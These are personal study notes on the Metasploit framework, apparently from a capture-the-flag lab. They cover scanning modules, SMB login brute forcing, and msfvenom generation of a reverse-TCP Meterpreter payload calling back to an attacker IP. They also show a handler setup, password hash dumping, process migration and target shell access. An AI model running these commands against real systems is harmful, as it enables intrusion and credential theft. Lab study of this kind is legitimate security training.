## metasploit
`help`
`show`
`use expoit/<rest_of_the_path>`
`info` - to get info about the module or exploit.
`show options`
`show payloads`
`search type:auxiliary telnet`
`search type:auxiliary smtp`
You can use `show options` against a particular exploit & set those mandatory parameters.
`set RHOSTS <target_ip>` - across a single exploit or module
`set RHOSTS <target_ip>` - across all modules
Once all the module parameters are set, you can launch the module using the `exploit` command. Metasploit also supports the `run` command which is an alias created for `exploit` comman as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.,)

The `exploit` command can be used without any parameters or using the -z parameter.
The `exploit -z` command will run the exploit and background the session as soon as it opens.


Once a vulnerability has been successfully exploited, a session will be created. This is the communication channel established between the target system and metasploit.

You can use the `background` command to background the session prompt and go back to the `msfconsole` prompt.
You can run the `sessions` command to see active sessions.
You can use the `session -i <session_num>` to interact with that session 

commands
- set LPORT 6666
- setg RHOSTS 10.10.19.23
- unset payload
- exploit

## metasploit portscan - check for open ports
- search portscan
- use 5
- show options
- set RHOSTS 10.10.166.211
- exploit -z or RUN

## You can run the nmap directly
- back
- nmap -sT -p- 10.10.166.211

## You can run udp scans as well to find out which services are running UDP
- search udp
- use auxiliary/scanner/discovery/udp_sweep

## SMB Scans
- metasploit offers several useful auxiliary modules that allow us to scan for specific services. 
- especially useful in a corporate network is `smb_version` & `smb_enumshares`
- search smb_version
- search smb_enumshares
- when performing service scans, it is important not to omit `exotic` services such as NETBIOS. NETBIOS is similar to SMB which allows computers to communicate over network to share files or send files to printers. The NETBIOS name of the target system can give you an idea about its role.
- search http_version
- run
- search smb_login
- set SMBUser penny
- set PASS_FILE <>

## database
- systemctl start postgresql
- msfdb init
- quit & re-launch msfconsole
- db_status
- workspace
- db_nmap -sT -p1-1000 10.10.166.154
- hosts -R (that sets the RHOSTS option)


- search smtp_relay
- search vnc_login
- info


- msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=10.18.112.115 LPORT=4444 > shell.elf

## ship it to the target machine & execute it
- msfconsole
- use exploit/multi/handler
- set LHOST 10.18.112.115
- set LPORT 4444
- set payload linux/x86/meterpreter_reverse_tcp
- run
- run post/linux/gather/hashdump


## detect the meterpreter session
- getpid
- tasklist /m /fi "pid eq 1304" -> to see all the DLL's used by the meterpreter process (PID:- 1304)
- migrate 715
- search -f flag.txt
- shell (will launch a command-line shell on the target system)
- ps
- getuid
- getpid
